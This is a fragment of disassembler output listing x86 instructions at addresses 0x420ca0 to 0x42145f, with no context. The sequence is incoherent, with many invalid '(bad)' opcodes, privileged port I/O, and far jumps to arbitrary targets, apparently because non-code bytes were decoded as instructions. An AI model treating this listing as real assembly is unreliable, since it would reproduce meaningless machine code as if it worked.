  420ca0:	bound  ebp,QWORD PTR [ecx-0x25]
  420ca3:	push   ebx
  420ca4:	dec    ebx
  420ca5:	or     BYTE PTR [ebx],cl
  420ca7:	in     al,0x7a
  420ca9:	adc    esi,edi
  420cab:	ss push ds
  420cad:	add    DWORD PTR [ebx],ecx
  420caf:	sahf   
  420cb0:	cwde   
  420cb1:	mov    ch,0xb1
  420cb3:	loope  0x420d2a
  420cb5:	popf   
  420cb6:	(bad)  
  420cb7:	cli    
  420cb8:	ret    0xcda
  420cbb:	clc    
  420cbc:	sbb    BYTE PTR [ebx+0x2d],ah
  420cbf:	cld    
  420cc0:	int    0x2b
  420cc2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420cc3:	add    esp,esi
  420cc5:	push   ebx
  420cc6:	enter  0x42b3,0xd9
  420cca:	jae    0x420c74
  420ccc:	fdiv   st(4),st
  420ccf:	add    BYTE PTR [ebx+0x53f031e2],ah
  420cd5:	aad    0xc
  420cd7:	pop    ss
  420cd8:	xchg   ebp,eax
  420cd9:	add    eax,0xd697bd8e
  420cde:	pop    esp
  420cdf:	retf   
  420ce0:	cmp    ah,BYTE PTR ds:0x65ede9a9
  420ce6:	xchg   DWORD PTR [esi-0x2cd399a1],ebx
  420cec:	sbb    bh,bl
  420cee:	cdq    
  420cef:	fild   WORD PTR [eax]
  420cf1:	jne    0x420cad
  420cf3:	jns    0x420d18
  420cf5:	cld    
  420cf6:	scas   eax,DWORD PTR es:[edi]
  420cf7:	dec    ebx
  420cf8:	fdivr  QWORD PTR [eax+0x20c7546f]
  420cfe:	adc    ch,bl
  420d00:	repnz mov cl,0x92
  420d03:	inc    esi
  420d04:	inc    esp
  420d05:	shl    BYTE PTR [ebx+0xc],1
  420d08:	cdq    
  420d09:	scas   al,BYTE PTR es:[edi]
  420d0a:	and    al,0x3b
  420d0c:	sahf   
  420d0d:	xor    eax,0x4aaa3b92
  420d12:	inc    eax
  420d13:	push   0x45
  420d15:	adc    ecx,DWORD PTR [edx]
  420d17:	or     al,0x9b
  420d19:	xchg   esp,eax
  420d1a:	push   0xffffffb2
  420d1c:	out    dx,eax
  420d1d:	inc    edi
  420d1e:	mov    esp,DWORD PTR [ecx]
  420d20:	pop    ds
  420d21:	pop    ds
  420d22:	stos   BYTE PTR es:[edi],al
  420d23:	and    eax,0x47a4ad3a
  420d28:	push   eax
  420d29:	mov    esi,ebp
  420d2b:	jl     0x420ce3
  420d2d:	pusha  
  420d2e:	inc    edx
  420d2f:	dec    ebx
  420d30:	dec    edx
  420d31:	sub    al,0x22
  420d33:	or     ah,BYTE PTR [edi-0x171f7af2]
  420d39:	icebp  
  420d3a:	lods   al,BYTE PTR ds:[esi]
  420d3b:	sub    bl,dh
  420d3d:	lods   al,BYTE PTR ds:[esi]
  420d3e:	addr16 mov al,0xd7
  420d41:	clc    
  420d42:	mov    edx,0x6d1ae7bc
  420d47:	cwde   
  420d48:	push   ss
  420d49:	in     al,dx
  420d4a:	mov    al,0xa4
  420d4c:	adc    ecx,DWORD PTR [edx+0x6d0b1bb6]
  420d52:	or     BYTE PTR ds:0x350c3954,ch
  420d58:	fild   DWORD PTR fs:[edx]
  420d5b:	push   ds
  420d5c:	call   0x566ca73c
  420d61:	add    edx,ebp
  420d63:	out    0x52,eax
  420d65:	or     al,bh
  420d67:	jge    0x420d57
  420d69:	dec    ecx
  420d6a:	push   0xbb1460b7
  420d6f:	aam    0x2
  420d71:	pop    es
  420d72:	jb     0x420d44
  420d74:	add    dh,BYTE PTR [ecx-0x50e93a63]
  420d7a:	mov    dh,0x89
  420d7c:	or     al,0xa5
  420d7e:	adc    DWORD PTR [ebp+0x1d],0x91027d41
  420d85:	pop    esp
  420d86:	ins    BYTE PTR es:[edi],dx
  420d87:	push   ds
  420d88:	xchg   ebx,eax
  420d89:	outs   dx,DWORD PTR ds:[esi]
  420d8a:	sbb    ebx,edx
  420d8c:	pop    ss
  420d8d:	sbb    al,0x99
  420d8f:	rol    BYTE PTR [ebp-0x227d3aa4],0x68
  420d96:	cli    
  420d97:	or     eax,DWORD PTR [eax]
  420d99:	mov    bh,0xa1
  420d9b:	dec    edi
  420d9c:	pop    edx
  420d9d:	lahf   
  420d9e:	adc    ah,0x75
  420da1:	pop    ds
  420da2:	in     eax,0x10
  420da4:	jg     0x420e0c
  420da6:	xchg   BYTE PTR [eax-0x6d05f4e5],ah
  420dac:	dec    esi
  420dad:	and    eax,0xeb0fd22b
  420db2:	jl     0x420dbb
  420db4:	push   esi
  420db5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420db6:	push   edi
  420db7:	mov    eax,0xa36c7e5d
  420dbc:	inc    ecx
  420dbd:	and    eax,0x5aa4976e
  420dc2:	dec    esi
  420dc3:	in     al,dx
  420dc4:	adc    ebx,edi
  420dc6:	ins    BYTE PTR es:[edi],dx
  420dc7:	clc    
  420dc8:	fiadd  WORD PTR [ecx+0x6398d52c]
  420dce:	and    bh,BYTE PTR [esi-0x31ffe9e5]
  420dd4:	cwde   
  420dd5:	cdq    
  420dd6:	fisttp DWORD PTR [eax+0x16070d5e]
  420ddc:	pop    esi
  420ddd:	cmp    bh,al
  420ddf:	sbb    BYTE PTR [ebx],0x45
  420de2:	repnz pop esp
  420de4:	bndstx [eax-0x11166d50],bnd1
  420deb:	or     BYTE PTR [ecx-0x2c],al
  420dee:	gs (bad) 
  420df0:	jg     0x420e39
  420df2:	out    dx,al
  420df3:	xchg   esi,eax
  420df4:	or     DWORD PTR [esi+0x1d662aa8],0xbd4e2e83
  420dfe:	leave  
  420dff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420e00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e01:	mov    ebp,0x39d33bb
  420e06:	test   bh,dh
  420e08:	test   DWORD PTR ds:0xa974f7ef,esi
  420e0e:	test   ah,ch
  420e10:	js     0x420dc9
  420e12:	retf   
  420e13:	adc    bh,BYTE PTR [ecx+0x7f40c864]
  420e19:	inc    ebp
  420e1a:	mov    dh,0x65
  420e1c:	inc    eax
  420e1d:	les    ebp,FWORD PTR [ecx+0x7e]
  420e20:	mov    bl,0x4f
  420e22:	jae    0x420dac
  420e24:	sar    cl,1
  420e26:	cmp    eax,0x36c5841f
  420e2b:	mov    ch,0x82
  420e2d:	and    al,0x47
  420e2f:	out    dx,eax
  420e30:	gs add dl,BYTE PTR ss:[edi-0x6d]
  420e35:	test   DWORD PTR [eax],0xb44331d5
  420e3b:	stc    
  420e3c:	in     eax,0x30
  420e3e:	out    dx,eax
  420e3f:	xor    eax,0xcd3961cb
  420e44:	test   DWORD PTR [edi-0x2c],ebx
  420e47:	mov    al,ds:0xf1d04afc
  420e4c:	mov    DWORD PTR [ecx+0x55],eax
  420e4f:	call   0x39892045
  420e54:	ins    DWORD PTR es:[edi],dx
  420e55:	xchg   ebp,ebp
  420e57:	(bad)  
  420e58:	pop    edx
  420e59:	xchg   eax,ebp
  420e5b:	test   al,0x75
  420e5d:	or     eax,0x306e5b44
  420e62:	(bad)  
  420e63:	xchg   ebx,eax
  420e64:	ja     0x420eb0
  420e66:	in     al,dx
  420e67:	xchg   edx,eax
  420e68:	xchg   edi,eax
  420e69:	jae    0x420e8f
  420e6b:	jle    0x420e33
  420e6d:	mov    esi,0x70b2ce18
  420e72:	test   BYTE PTR [ecx],cl
  420e74:	mov    esi,0x924ff17d
  420e79:	adc    cl,dh
  420e7b:	add    al,BYTE PTR [edx]
  420e7d:	outs   dx,DWORD PTR ds:[esi]
  420e7e:	jl     0x420ec6
  420e80:	or     edx,DWORD PTR [edi+0x2e7b324e]
  420e86:	je     0x420e14
  420e88:	dec    eax
  420e89:	sub    ebx,DWORD PTR [eax]
  420e8b:	pop    ebp
  420e8c:	rcr    DWORD PTR [ecx+0x339bf956],cl
  420e92:	cli    
  420e93:	ror    ebp,cl
  420e95:	push   es
  420e96:	fist   DWORD PTR [edi]
  420e98:	mov    edi,DWORD PTR [ebp+0xa]
  420e9b:	jnp    0x420e5b
  420e9d:	pop    ebp
  420e9e:	(bad)  [eax+ecx*4-0x56]
  420ea2:	out    dx,eax
  420ea3:	out    dx,eax
  420ea4:	push   ds
  420ea5:	sahf   
  420ea6:	iret   
  420ea7:	lds    esp,FWORD PTR [edx+0x61]
  420eaa:	cwde   
  420eab:	jae    0x420f0e
  420ead:	sub    BYTE PTR [esi],0x72
  420eb0:	adc    al,0xec
  420eb2:	ret    
  420eb3:	cmp    ecx,ecx
  420eb5:	sub    ah,BYTE PTR [ebx+0x9]
  420eb8:	arpl   WORD PTR [eax-0x139886a8],bp
  420ebe:	jl     0x420e52
  420ec0:	jo     0x420ec3
  420ec2:	mov    bl,0xa1
  420ec4:	inc    esi
  420ec5:	das    
  420ec6:	es icebp 
  420ec8:	sub    eax,esi
  420eca:	push   ebx
  420ecb:	jo     0x420f20
  420ecd:	hlt    
  420ece:	or     BYTE PTR ds:0xd874e723,bh
  420ed4:	sbb    al,0x9d
  420ed6:	int3   
  420ed7:	cmp    edx,DWORD PTR [edx-0x41]
  420eda:	pusha  
  420edb:	sbb    dh,BYTE PTR [ecx+0x2cb46825]
  420ee1:	mov    dl,0x63
  420ee3:	xchg   BYTE PTR [ebp-0x52],bl
  420ee6:	jo     0x420f29
  420ee8:	cmp    al,0x94
  420eea:	xchg   BYTE PTR [esi+0x42c4e3bb],dh
  420ef0:	jnp    0x420f12
  420ef2:	out    0xc0,al
  420ef4:	arpl   WORD PTR [ecx-0x4f],dx
  420ef7:	add    BYTE PTR [ecx],cl
  420ef9:	add    edx,esi
  420efb:	mov    ebp,0x86353f60
  420f00:	loopne 0x420f43
  420f02:	add    al,0xb6
  420f04:	fadd   QWORD PTR [ebx+ecx*4+0x34da7d53]
  420f0b:	ins    BYTE PTR es:[edi],dx
  420f0c:	xchg   ecx,eax
  420f0d:	jae    0x420f53
  420f0f:	aad    0x49
  420f11:	dec    ebp
  420f12:	into   
  420f13:	lock jbe 0x420eb1
  420f16:	push   cs
  420f17:	clc    
  420f18:	test   ecx,esp
  420f1a:	(bad)
  420f1e:	rcr    DWORD PTR [edi],0xb2
  420f21:	pop    esi
  420f22:	ja     0x420ea6
  420f24:	ds pop esp
  420f26:	sub    BYTE PTR [ecx-0xeff43a8],bl
  420f2c:	mov    esi,0x301864a5
  420f31:	outs   dx,DWORD PTR ds:[esi]
  420f32:	xchg   BYTE PTR [eax+eax*1],dh
  420f35:	out    dx,eax
  420f36:	mov    WORD PTR [edx+0x6d],cs
  420f39:	ja     0x420ef7
  420f3b:	and    al,0x9e
  420f3d:	imul   ebx,DWORD PTR [edi],0x7d
  420f40:	ds (bad) 
  420f42:	cmp    al,0xfd
  420f44:	es fsin 
  420f47:	inc    eax
  420f48:	iret   
  420f49:	xchg   edx,eax
  420f4a:	(bad)  [ebp-0x7f132f37]
  420f50:	pushf  
  420f51:	clc    
  420f52:	sub    eax,0x38dd0835
  420f57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420f58:	fs mov dl,0x91
  420f5b:	enter  0xb608,0x92
  420f5f:	add    BYTE PTR [esi+edx*1+0x4a6c5368],0x29
  420f67:	add    al,0xb8
  420f69:	in     al,dx
  420f6a:	xor    eax,0xf5f0edaa
  420f6f:	cmp    al,0xd8
  420f71:	mov    ds:0xeb3e34bd,al
  420f76:	mov    ds,WORD PTR ds:0x6b87d279
  420f7c:	jbe    0x420f13
  420f7e:	adc    esp,DWORD PTR [ebx-0x4d]
  420f81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420f82:	(bad)  
  420f83:	xor    BYTE PTR [ecx-0x1cf54636],al
  420f89:	mov    ds,WORD PTR [edi-0x7d03cdcc]
  420f8f:	or     dl,BYTE PTR [edx]
  420f91:	xchg   DWORD PTR [ebx],eax
  420f93:	xchg   edi,eax
  420f94:	addr16 addps xmm0,xmm4
  420f98:	sub    al,0x83
  420f9a:	arpl   WORD PTR [esi],sp
  420f9c:	mov    eax,ds:0x600ca862
  420fa1:	adc    ebp,DWORD PTR [ecx]
  420fa3:	cdq    
  420fa4:	dec    ebx
  420fa5:	or     DWORD PTR [ebx-0x74],esi
  420fa8:	or     ah,al
  420faa:	lods   al,BYTE PTR ds:[esi]
  420fab:	call   0x110e:0x7a2c52f9
  420fb2:	addr16 pop eax
  420fb4:	sbb    edi,0x1c
  420fb7:	jnp    0x420f70
  420fb9:	pop    edi
  420fba:	les    esi,FWORD PTR [edi+0x14]
  420fbd:	mov    ecx,0x5691edfb
  420fc2:	jmp    0x2ec2:0x5b8f5016
  420fc9:	into   
  420fca:	inc    esi
  420fcb:	test   DWORD PTR [edx-0x3e8d7ea3],ebp
  420fd1:	xor    al,0xfa
  420fd3:	pop    ecx
  420fd4:	stos   BYTE PTR es:[edi],al
  420fd5:	pop    ebx
  420fd6:	bound  esi,QWORD PTR [edi+0x7b]
  420fd9:	sbb    eax,0xc6377f7d
  420fde:	cmp    eax,0xad7568a6
  420fe3:	adc    eax,0x6b8c1267
  420fe8:	push   ss
  420fe9:	dec    ebx
  420fea:	(bad)  
  420feb:	fsub   QWORD PTR [edx+0x2b]
  420fee:	sub    BYTE PTR [ebx],0x5
  420ff1:	into   
  420ff2:	add    ebp,DWORD PTR [ecx+eiz*8]
  420ff5:	or     al,0x61
  420ff7:	mov    es,WORD PTR [ebp-0x40]
  420ffa:	sbb    DWORD PTR [ebx+0x646be083],esi
  421000:	sbb    ebp,DWORD PTR [ebx+0x49]
  421003:	push   0x90e851d8
  421008:	addr16 inc esp
  42100a:	setp   ch
  42100d:	pop    esi
  42100e:	pop    ds
  42100f:	pop    es
  421010:	jns    0x421054
  421012:	outs   dx,DWORD PTR ds:[esi]
  421013:	pop    esp
  421014:	into   
  421015:	imul   esp,ecx,0xf4baa19d
  42101b:	repnz xor DWORD PTR [esi-0x7c],ebp
  42101f:	xor    al,0x26
  421021:	ror    DWORD PTR [ebx],cl
  421023:	jo     0x420fe1
  421025:	rol    edi,cl
  421027:	dec    edx
  421028:	fild   DWORD PTR [eax-0x75]
  42102b:	jo     0x420ffb
  42102d:	pusha  
  42102e:	icebp  
  42102f:	mov    ds:0x1bc88b72,al
  421034:	bound  esi,QWORD PTR [ecx+0x31]
  421037:	mov    eax,ds:0xc0c50faf
  42103c:	pop    edx
  42103d:	leave  
  42103e:	add    edx,DWORD PTR [edx-0x7dfcf207]
  421044:	test   DWORD PTR [edi-0x5c90e124],esp
  42104a:	and    BYTE PTR [edx],dh
  42104c:	cmc    
  42104d:	jae    0x42106b
  42104f:	cmp    esi,edx
  421051:	rcl    DWORD PTR [ebx+0x37f37c4b],cl
  421057:	ror    DWORD PTR [eax+0x44f90a5a],0x43
  42105e:	mov    ah,0x80
  421060:	pop    ebp
  421061:	rol    BYTE PTR [edx*2-0xdb36896],cl
  421068:	sub    ebp,ebx
  42106a:	mov    WORD PTR [edx-0x36],?
  42106d:	jp     0x421012
  42106f:	xor    ebx,DWORD PTR [eax]
  421071:	xor    BYTE PTR [ecx-0x36],dh
  421074:	add    edx,ebp
  421076:	std    
  421077:	push   edi
  421078:	push   edi
  421079:	lea    ecx,[ecx+edx*1+0x70]
  42107d:	sub    BYTE PTR [edi+0xeeea290],al
  421083:	lds    ebp,FWORD PTR [ebx]
  421085:	jge    0x421055
  421087:	ins    BYTE PTR es:[edi],dx
  421088:	or     eax,0x4759cdf0
  42108d:	ins    DWORD PTR es:[edi],dx
  42108e:	loopne 0x421109
  421090:	xchg   edx,eax
  421091:	adc    cl,cl
  421093:	test   BYTE PTR [eax+ebp*1+0x72bb015b],0xf5
  42109b:	(bad)  
  42109c:	dec    ebx
  42109d:	sbb    eax,0x41ea215
  4210a2:	dec    ebx
  4210a3:	jp     0x42109f
  4210a5:	push   cs
  4210a6:	test   DWORD PTR [ebx-0x2d],ebp
  4210a9:	(bad)  
  4210aa:	es ins DWORD PTR es:[edi],dx
  4210ac:	pop    ds
  4210ad:	or     bh,BYTE PTR [edi]
  4210af:	sub    ah,bh
  4210b1:	xlat   BYTE PTR ds:[ebx]
  4210b2:	mov    al,0x70
  4210b4:	push   ebx
  4210b5:	adc    esp,edx
  4210b7:	or     edx,DWORD PTR [edi+0x8abbed3]
  4210bd:	jbe    0x421048
  4210bf:	dec    ecx
  4210c0:	dec    ebx
  4210c1:	push   es
  4210c2:	jae    0x42106b
  4210c4:	pop    esi
  4210c5:	xor    BYTE PTR [edi-0x3b],dh
  4210c8:	out    dx,eax
  4210c9:	jge    0x42114a
  4210cb:	jb     0x421065
  4210cd:	sti    
  4210ce:	mov    eax,0x3c851566
  4210d3:	mov    dh,BYTE PTR [eax]
  4210d5:	cs (bad) 
  4210d7:	lods   al,BYTE PTR ds:[esi]
  4210d8:	fadd   DWORD PTR [eax-0x7690013]
  4210de:	inc    eax
  4210df:	cdq    
  4210e0:	push   0x530e6803
  4210e5:	adc    DWORD PTR [ebx],edi
  4210e7:	adc    ebx,DWORD PTR [edi+0x57]
  4210ea:	outs   dx,BYTE PTR ds:[esi]
  4210eb:	jecxz  0x4210ec
  4210ed:	pop    edx
  4210ee:	frstor [esi-0x71]
  4210f1:	xchg   edx,esp
  4210f3:	data16 mov al,0xc5
  4210f6:	pop    ebx
  4210f7:	mov    edx,0x8b42ca3a
  4210fc:	xor    DWORD PTR [edi+0x6bc6be8b],esp
  421102:	retf   0x906c
  421105:	out    0x83,al
  421107:	xchg   ebp,esp
  421109:	pop    esi
  42110a:	jns    0x421098
  42110c:	retf   
  42110d:	cmp    eax,DWORD PTR [esi+0x798d746f]
  421113:	and    bh,cl
  421115:	dec    edx
  421116:	cmp    esp,0x25
  421119:	out    dx,al
  42111a:	mov    ah,0x41
  42111c:	mov    DWORD PTR [esi-0x25873d24],0x11d1994f
  421126:	xor    edi,ecx
  421128:	fcomp  DWORD PTR [edi]
  42112a:	mov    bl,0x9d
  42112c:	in     eax,0x26
  42112e:	aaa    
  42112f:	rol    ebp,cl
  421131:	push   0xe0b0a4ef
  421136:	bound  esi,QWORD PTR [ecx]
  421138:	dec    edi
  421139:	fild   QWORD PTR [ebx+eiz*2]
  42113c:	jmp    0x4210ea
  42113e:	push   ss
  42113f:	mov    ecx,0x5d030c8c
  421144:	paddusb mm7,QWORD PTR [esi+0x8dcfd1f]
  42114b:	mov    al,BYTE PTR [eax-0x43]
  42114e:	add    ch,dh
  421150:	jge    0x421162
  421152:	mov    bh,0x53
  421154:	add    ecx,DWORD PTR [eax-0x17bc7758]
  42115a:	and    bl,bh
  42115c:	pop    edx
  42115d:	add    bh,cl
  42115f:	cmp    ecx,DWORD PTR [ecx-0x23]
  421162:	jne    0x42115d
  421164:	imul   esp,DWORD PTR [ebp-0x25c1addc],0xe28c4605
  42116e:	enter  0xbc75,0x34
  421172:	add    ebp,DWORD PTR [eax+0xdcb3431]
  421178:	adc    dh,BYTE PTR [esi]
  42117a:	imul   edi,DWORD PTR [ebp+0xb],0xffffffb7
  42117e:	mov    es,WORD PTR [esi]
  421180:	int3   
  421181:	add    al,0xa1
  421183:	mov    eax,0xf2692e06
  421188:	sbb    al,0xce
  42118a:	mov    ebp,0x2438c334
  42118f:	sub    cl,BYTE PTR [ebx+0x4674de17]
  421195:	push   ebx
  421196:	inc    esi
  421197:	xchg   esp,eax
  421198:	and    eax,0x73bff8cf
  42119d:	mov    eax,0xeb9a361a
  4211a2:	ja     0x421208
  4211a4:	or     edx,ebx
  4211a6:	outs   dx,BYTE PTR ds:[esi]
  4211a7:	fcom   QWORD PTR [edi+0x5a]
  4211aa:	cli    
  4211ab:	xchg   edx,eax
  4211ac:	mov    ebp,0x9537e054
  4211b1:	add    eax,0xbe38b729
  4211b6:	adc    ch,bh
  4211b8:	jmp    0x5ed026ba
  4211bd:	mov    edx,DWORD PTR [edx]
  4211bf:	inc    esi
  4211c0:	pushf  
  4211c1:	arpl   WORD PTR [edx],sp
  4211c3:	cld    
  4211c4:	in     al,0x6e
  4211c6:	ja     0x421195
  4211c8:	lods   eax,DWORD PTR ds:[esi]
  4211c9:	not    DWORD PTR [ecx]
  4211cb:	add    al,0xdc
  4211cd:	pop    edi
  4211ce:	ins    BYTE PTR es:[edi],dx
  4211cf:	loopne 0x421197
  4211d1:	add    DWORD PTR [ebp+edi*8-0x2128902a],ebx
  4211d8:	test   ebx,eax
  4211da:	pop    es
  4211db:	push   esi
  4211dc:	sub    al,0xf7
  4211de:	out    dx,al
  4211df:	fdivr  st,st(0)
  4211e1:	and    ebp,DWORD PTR [ecx-0x2e297bb7]
  4211e7:	shl    DWORD PTR [edi-0x493ebf79],1
  4211ed:	call   0xe50f:0xadeca6c1
  4211f4:	popf   
  4211f5:	inc    ebx
  4211f6:	lods   al,BYTE PTR ds:[esi]
  4211f7:	fs aaa 
  4211f9:	repz and esi,ebx
  4211fc:	fdiv   DWORD PTR [ecx]
  4211fe:	cdq    
  4211ff:	inc    ebp
  421200:	add    eax,0x50587d90
  421205:	ret    0x9117
  421208:	je     0x4211ce
  42120a:	mov    cl,0xd2
  42120c:	adc    al,dl
  42120e:	inc    ebp
  42120f:	or     al,0x7f
  421211:	aas    
  421212:	jecxz  0x421289
  421214:	jb     0x4211e9
  421216:	pusha  
  421217:	cmp    al,0xf9
  421219:	inc    ecx
  42121a:	ins    DWORD PTR es:[edi],dx
  42121b:	mov    esp,0xb62ee732
  421220:	push   cs
  421221:	scas   eax,DWORD PTR es:[edi]
  421222:	fimul  DWORD PTR [eax+0x48]
  421225:	jo     0x421253
  421227:	mov    ebx,0xcc8b2aa
  42122c:	fidiv  DWORD PTR [ebx+esi*2+0x76]
  421230:	fisttp WORD PTR [ebx]
  421232:	mov    BYTE PTR [esi+0x2e],al
  421235:	push   es
  421236:	xchg   ecx,eax
  421237:	sub    edx,DWORD PTR [edi-0x3d]
  42123a:	loop   0x42120a
  42123c:	fsub   QWORD PTR [edx+0x3e14f56f]
  421242:	clc    
  421243:	in     eax,0x14
  421245:	adc    al,0x5d
  421247:	xor    BYTE PTR [edx-0x5c],0xeb
  42124b:	cmp    dh,dl
  42124d:	push   bx
  42124f:	out    0xa8,eax
  421251:	test   BYTE PTR [ecx-0x6472f705],0x14
  421258:	ins    DWORD PTR es:[edi],dx
  421259:	mov    al,0x74
  42125b:	jmp    0xbbf7ebca
  421260:	add    al,0xee
  421262:	sbb    eax,edx
  421264:	out    0x37,al
  421266:	lock add DWORD PTR [ebx-0x15],0xffffffd4
  42126b:	out    0x1b,eax
  42126d:	jmp    0xa03780d9
  421272:	xor    dh,cl
  421274:	jl     0x4211f9
  421276:	fs mov bh,0x91
  421279:	adc    eax,0xf113e15d
  42127e:	sbb    al,dl
  421280:	pop    ss
  421281:	rcr    BYTE PTR ds:0xa2f73d4,1
  421287:	jmp    0x66f3efd8
  42128c:	test   DWORD PTR [edi],edx
  42128e:	popa   
  42128f:	pusha  
  421290:	lds    esi,FWORD PTR [ecx+eiz*2]
  421293:	jns    0x42124e
  421295:	jae    0x4212cc
  421297:	ins    DWORD PTR es:[edi],dx
  421298:	fcomp  DWORD PTR [ecx-0x3f]
  42129b:	mov    dl,0x8f
  42129d:	fmul   QWORD PTR [esi+0x4f]
  4212a0:	dec    ebp
  4212a1:	mov    edi,0x4e006e11
  4212a6:	cmp    eax,0xb0208e74
  4212ab:	xor    ecx,DWORD PTR [edx-0xb]
  4212ae:	in     eax,0x44
  4212b0:	jg     0x421254
  4212b2:	fs cld 
  4212b4:	sbb    al,0xd4
  4212b6:	jg     0x421258
  4212b8:	int3   
  4212b9:	add    al,0xaa
  4212bb:	or     ecx,DWORD PTR [ebp-0x342e3f3b]
  4212c1:	push   edx
  4212c2:	imul   BYTE PTR [edi+ebp*2]
  4212c5:	or     eax,ecx
  4212c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4212c8:	in     eax,0x1b
  4212ca:	mov    al,ds:0xf95ce2b0
  4212cf:	clc    
  4212d0:	imul   edi,DWORD PTR [ebp+0x4c],0x43b57b7a
  4212d7:	push   ecx
  4212d8:	scas   al,BYTE PTR es:[edi]
  4212d9:	or     bl,BYTE PTR [esi+ebx*1]
  4212dc:	sbb    ebx,DWORD PTR ds:0x7c78c2ce
  4212e2:	js     0x421348
  4212e4:	dec    ebp
  4212e5:	aas    
  4212e6:	loop   0x4212c9
  4212e8:	stc    
  4212e9:	std    
  4212ea:	add    BYTE PTR [ebx+0x4],dh
  4212ed:	pop    edi
  4212ee:	int3   
  4212ef:	test   al,0x2
  4212f1:	mov    ecx,0x8b8884fa
  4212f6:	fist   DWORD PTR [ebx]
  4212f8:	jge    0x421356
  4212fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4212fb:	fsubr  st,st(6)
  4212fd:	out    0xce,eax
  4212ff:	xor    BYTE PTR [eax+0x4ac3034d],ch
  421305:	mov    BYTE PTR [edx+0x48],0x7c
  421309:	lds    esi,FWORD PTR [edi]
  42130b:	push   es
  42130c:	and    DWORD PTR [edx+0x7a],edi
  42130f:	aad    0x4c
  421311:	inc    ebp
  421312:	adc    ecx,eax
  421314:	add    eax,0xf740975f
  421319:	or     ebx,ecx
  42131b:	pop    ecx
  42131c:	icebp  
  42131d:	ror    BYTE PTR [eax],1
  42131f:	sbb    eax,0xfb5c3dd0
  421324:	and    cl,ch
  421326:	push   edx
  421327:	js     0x42132f
  421329:	aam    0x93
  42132b:	mov    DWORD PTR [edi],0x43874f44
  421331:	xchg   edx,eax
  421332:	inc    edx
  421333:	test   BYTE PTR [eax],dl
  421335:	push   ss
  421336:	in     eax,dx
  421337:	daa    
  421338:	enter  0xa840,0x93
  42133c:	ds xchg ecx,eax
  42133e:	or     eax,esp
  421340:	sahf   
  421341:	sbb    BYTE PTR [ecx+0x69],cl
  421344:	jl     0x421344
  421346:	xor    eax,0x2f039a9
  42134b:	arpl   WORD PTR [edi+ebp*2-0x8],bx
  42134f:	and    DWORD PTR ds:[ecx+0x13df143a],esp
  421356:	mov    ds:0x9a12be67,eax
  42135b:	loope  0x421331
  42135d:	jp     0x421363
  42135f:	xor    BYTE PTR [esi-0x7c],0xeb
  421363:	pop    edx
  421364:	rol    BYTE PTR [edx-0x75],cl
  421367:	xor    dl,BYTE PTR ds:[ebx]
  42136a:	mov    esp,0x73d57f2c
  42136f:	mov    DWORD PTR [eax],0x16ef4233
  421375:	jmp    0xea63:0x49d3c6bd
  42137c:	mov    ds:0xf8e112d5,eax
  421381:	int3   
  421382:	ficom  DWORD PTR ds:0x90291bf7
  421388:	fucomip st,st(3)
  42138a:	scas   eax,DWORD PTR es:[edi]
  42138b:	mov    ?,WORD PTR [edi+0x61fc0fff]
  421391:	test   ecx,ebp
  421393:	add    BYTE PTR [esi+0x5dddfa5],al
  421399:	cld    
  42139a:	gs jecxz 0x4213b4
  42139d:	cmp    esi,edx
  42139f:	pop    esp
  4213a0:	mov    BYTE PTR [ebp-0xe19b7b0],al
  4213a6:	pop    esp
  4213a7:	xor    eax,ebp
  4213a9:	aad    0x8a
  4213ab:	jmp    0x47d0f60
  4213b0:	xor    bl,BYTE PTR [esi]
  4213b2:	inc    esp
  4213b3:	inc    eax
  4213b4:	or     eax,0xf6b2e929
  4213b9:	mov    edi,0xf65da7e3
  4213be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4213bf:	gs jle 0x42138f
  4213c2:	inc    edi
  4213c3:	jecxz  0x421424
  4213c5:	fwait
  4213c6:	aad    0x75
  4213c8:	enter  0x71e,0xd6
  4213cc:	out    dx,eax
  4213cd:	inc    ecx
  4213ce:	or     DWORD PTR [eax+0x18],ecx
  4213d1:	jnp    0x4213b0
  4213d3:	inc    esp
  4213d4:	ret    
  4213d5:	and    ch,dl
  4213d7:	mov    WORD PTR [esi+0x702d511d],cs
  4213dd:	push   es
  4213de:	in     al,0x86
  4213e0:	stos   DWORD PTR es:[edi],eax
  4213e1:	fucomp st(1)
  4213e3:	fs scas eax,DWORD PTR es:[edi]
  4213e5:	loop   0x4213a6
  4213e7:	test   al,0x19
  4213e9:	call   0x709f:0xd0d44301
  4213f0:	lahf   
  4213f1:	in     eax,0x5a
  4213f3:	mov    al,0x84
  4213f5:	pushf  
  4213f6:	das    
  4213f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4213f8:	addr16 push 0x4ee23df5
  4213fe:	mov    ds:0xd982a87f,al
  421403:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421404:	sub    DWORD PTR [ebx-0x2d],0xea4635f1
  42140b:	sub    BYTE PTR [esi-0x26],ch
  42140e:	or     BYTE PTR [edi-0x6],bh
  421411:	jle    0x4213f0
  421413:	(bad)  
  421414:	mov    bl,0x60
  421416:	ja     0x421468
  421418:	lds    esi,FWORD PTR [esi]
  42141a:	in     eax,dx
  42141b:	jmp    0x4213a8
  42141d:	repnz ss mov dl,0xf8
  421421:	xor    ah,BYTE PTR [ecx]
  421423:	or     ebp,DWORD PTR [esi+0x1258e2f5]
  421429:	in     eax,0x19
  42142b:	cld    
  42142c:	mov    ebx,0xf5b966c2
  421431:	add    al,0x81
  421433:	scas   al,BYTE PTR es:[edi]
  421434:	js     0x421415
  421436:	sub    al,0xc1
  421438:	cmp    al,0x3d
  42143a:	int    0xe7
  42143c:	data16 fcomp QWORD PTR [eax+edi*2+0x17465c5d]
  421444:	push   cs
  421445:	(bad)  
  421446:	sub    DWORD PTR [edx*2-0x5551f207],ebx
  42144d:	jecxz  0x421470
  42144f:	stos   BYTE PTR es:[edi],al
  421450:	xchg   esp,eax
  421451:	fs adc al,0x4c
  421454:	sbb    eax,0x4114d8df
  421459:	test   al,0xd1
  42145b:	dec    ebx
  42145c:	jns    0x4214ae
  42145e:	(bad)  
  42145f:	int    0x9b
